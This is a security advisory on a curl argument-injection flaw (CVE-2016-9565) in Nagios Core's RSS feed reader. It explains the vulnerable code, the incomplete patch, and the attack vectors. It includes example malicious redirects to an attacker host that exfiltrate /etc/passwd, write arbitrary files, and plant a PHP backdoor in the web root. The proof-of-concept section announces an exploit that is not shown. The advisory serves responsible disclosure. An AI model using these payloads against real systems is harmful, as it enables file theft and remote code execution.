III. INTRODUCTION
-------------------------

Nagios Core comes with a PHP/CGI front-end which allows to view status
of the monitored hosts.
This front-end contained a Command Injection vulnerability in a RSS feed reader
class that loads (via insecure clear-text HTTP or HTTPS accepting self-signed 
certificates) the latest Nagios news from a remote RSS feed (located on the 
vendor's server on the Internet) upon log-in to the Nagios front-end.
The vulnerability could potentially enable remote unauthenticated attackers who
 managed to impersonate the feed server (via DNS poisoning, domain hijacking, 
ARP spoofing etc.), to provide a malicious response that injects parameters to 
curl command used by the affected RSS client class and effectively 
read/write arbitrary files on the vulnerable Nagios server.
This could lead to Remote Code Execution in the context of www-data/nagios user
on default Nagios installs that follow the official setup guidelines.

IV. DESCRIPTION
-------------------------


Vulnerability
~~~~~~~~~~~~~~~

The vulnerability was caused by the use of a vulnerable component for handling 
RSS news feeds - MagpieRSS in Nagios Core control panel / front-end.
The component was used by Nagios front-end to load news feeds from remote
feed source upon log-in.
The component was found vulnerable to CVE-2008-4796. 

Below are relevant parts of code from the vulnerable RSS class:

----------------------------------------------------

function fetch($URI)
{
...
	case "https":
		...
		$path = $URI_PARTS["path"].($URI_PARTS["query"] ? "?".$URI_PARTS["query"] : "");
		$this->_httpsrequest($path, $URI, $this->_httpmethod);
		...
}
...
function _httpsrequest($url,$URI,$http_method,$content_type="",$body="")
{
	# accept self-signed certs
	$cmdline_params .= " -k"; 
	exec($this->curl_path." -D \"/tmp/$headerfile\"".escapeshellcmd($cmdline_params)." ".escapeshellcmd($URI),$results,$return);

---------------------------------------------------------


As can be seen, the _httpsrequest function uses a curl command to handle HTTPS 
requests. The sanitization used to escape $URI did not prevent injection of 
additional parameters to curl command which made it possible to, for example, get 
curl to write out the https response to an arbitrary file with the $URI:

https://attacker-svr -o /tmp/result_file

The vulnerability was reported to Nagios security team. 
Nagios 4.2.0 was released which contained the following fix for CVE-2008-4796:

---------------------------------------------------------

# accept self-signed certs
$cmdline_params .= " -k"; 
exec($this->curl_path." -D \"/tmp/$headerfile\"".$cmdline_params." \"".escapeshellcmd($URI)."\"",$results,$return);

---------------------------------------------------------

Further research found the fix to be incomplete as the extra sanitization
by the above patch could be bypassed by adding extra quote characters in
the $URI variable e.g:

https://attacker-svr" -o /tmp/nagioshackedagain "

This vulnerability has been assigned CVE-2016-9565 and was addressed by Nagios
team in the new release of Nagios 4.2.2 by removing the vulnerable class.


Injection Point / Controling $URI var
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The affected versions of Nagios Core front-end contain three files that trigger
the _httpsrequest() function with the injectable curl command shown above:

- rss-corefeed.php
- rss-corebanner.php
- rss-newsfeed.php

These are used to fetch news via an RSS feed from www.nagios.org website via
HTTP or HTTPS (see the notes below) protocols.
The news are displayed on the Home page of the Nagios front-end upon log-in.

All 3 scripts call fetch_rss() as follows:

------[ rss-corefeed.php ]------

<?php

//build splash divs to ajax load
do_corefeed_html();

function do_corefeed_html() {

        $url="http://www.nagios.org/backend/feeds/corepromo";
        $rss=fetch_rss($url);
        $x=0;
        //build content string
        if($rss) {
                $html ="
                <ul>";

                foreach ($rss->items as $item){
                        $x++;
                        if($x>3)
                                break;
                        //$href = $item['link'];
                        //$title = $item['title'];
                        $desc = $item['description'];
                        $html .="<li>{$item['description']}</li>";
                        }
                $html .="</ul>";

                print $html;

--------------------------------


An attacker who managed to impersonate www.nagios.org domain and respond to the web 
request made by the fetch_rss() function could send a malicious 302 redirect to set 
$URI variable from the _httpsrequest() function to an arbitrary value and thus
control the curl command parameters.

For example, the following redirect:

Location: https://attackers-host/get-data.php -Fpasswd=@/etc/passwd

would execute curl with the parameters:

curl -D /tmp/$headerfile https://attackers-host/get-data.php -Fpasswd=@/etc/passwd

and send the contents of the pnsswd file from the Nagios system to the attacker's 
server in a POST request.


Attack Vectors
~~~~~~~~~~~~~~~~~~

In order to supply a malicious response to fetch_rss() the attacker would
need to impersonate the www.nagios.org domain in some way. 
Well-positioned attackers within the target's network could try network
attacks such as DNS spoofing, ARP poisoning etc.

A compromised DNS server/resolver within an organisation could be used by 
attackers to exploit the Nagios vulnerability to gain access to the monitoring
server.

The vulnerability could potentially become an Internet threat and be used to 
exploit a large number of affected Nagios installations in case of a compromise 
of a DNS server/resolver belonging to a large-scale ISP.


Notes
~~~~~~~~~~~~~~~~~~

[*] Nagios front-end in versions <= 4.0.5 automatically load the rss-*.php files 
upon login to the Nagios control panel. Later versions contain the 
vulnerable scripts but do not load them automatically. 
On such installations an attacker could still be successful in one of the cases:

a) if attacker had low-privileged access (guest/viewer account) to the control 
panel and was able to execute /nagios/rss-newsfeed.php script

b) perform a CSRF attack / entice a logged-in nagios user to open the URL:
   http://nagios-server/nagios/rss-newsfeed.php

c) well-positioned attackers on the network might be able to modify the
traffic and inject a redirect to /rss-newsfeed.php script when Nagios control 
panel is accessed via HTTP by an authenticated user


[*] The rss-*.php scripts in Nagios Core >=4.0.8 use HTTPS to fetch news feeds 
however as has been previously shown in _httpsrequest() function, the curl
command gets passed a '-k' (--insecure) parameter which accepts self-signed
certificates.


Arbitrary Code Execution
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nagios Core installations that follow the official installation guidelines:

https://assets.nagios.com/downloads/nagioscore/docs/Installing_Nagios_Core_From_Source.pdf

as well as the commercial Nagios VMs available for purchase on the vendor website
make the web-server user (www-data) part of the 'nagios' group which has
write access to the web document root (/usr/local/nagios/share).

This can allow attackers who manage to exploit the vulnerability and 
inject parameters to curl command to save a PHP backdoor within the document
root via a 302 redirect similar to:

Location: http://attacker/php-backdoor.php --trace-ascii /usr/local/nagios/share/nagios-backdoor.php

and have it executed automatically upon a log-in to the Nagios control panel via html/JS code 
snippet returned as a part of the RSS feed as demonstrated by the PoC exploit below. 

The privileges could then be raised from nagios user to root via another Nagios
vulnerability discovered by the author of this advisory CVE-2016-9566:

http://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html


V. PROOF OF CONCEPT
-------------------------

Below is an exploit that demonstrates reading, writing, and code execution
on affected Nagios installations.
The attack flow is as follows:

For simplicity, to test the attack vector, a static DNS entry can be added
inside the /etc/hosts file on the victim Nagios server to point the
www.nagios.org domain at an attacker's IP where the exploit is executed.

VI. BUSINESS IMPACT
-------------------------

Successfull exploitation of the vulnerability could allow remote attackers
to extract sensitive data from the Nagios monitoring server as well as
achieve arbitrary code execution as demonstrated by the exploit.
The monitoring server is usually critical within an organisation as it 
often has remote access to all hosts within the network. For this reason
a compromise could likely allow attackers to expand their access within
the network to other internal servers.

Corporate monitoring servers with a large number of connected hosts are
often left unpatched due to their sensitive/central role on the network 
which increase the chances of exploitation. 

As explained in the description section, the vulnerability could be a threat 
coming from the Internet. If a major ISP / DNS, or nagios.org site itself was 
compromised, this could potentially allow attackers to exploit the vulnerability
on multiple Nagios installations which retrieve RSS feeds automatically and the
corporate firewall does not stop the egress traffic from the monitoring server. 
As a result, an attacker could potentially gain unauthorised access to 
affected Nagios installations without even knowing the target IP addresses
and despite a lack of direct access to the target (blocked igress traffic on
the firewall).


VII. SYSTEMS AFFECTED
-------------------------

Both of the Nagios Core stable branches 3.x and 4.x are affected.

The vulnerability was disclosed responsibly to the vendor and was fully fixed 
in Nagios Core 4.2.2.

Nagios Core versions <= 4.0.5 are at the highest risk as they are the easiest 
to exploit (automatically load the vulnerable scripts upon log-in to the Nagios 
control panel).

VIII. SOLUTION
-------------------------

Update to the latest Nagios Core release.
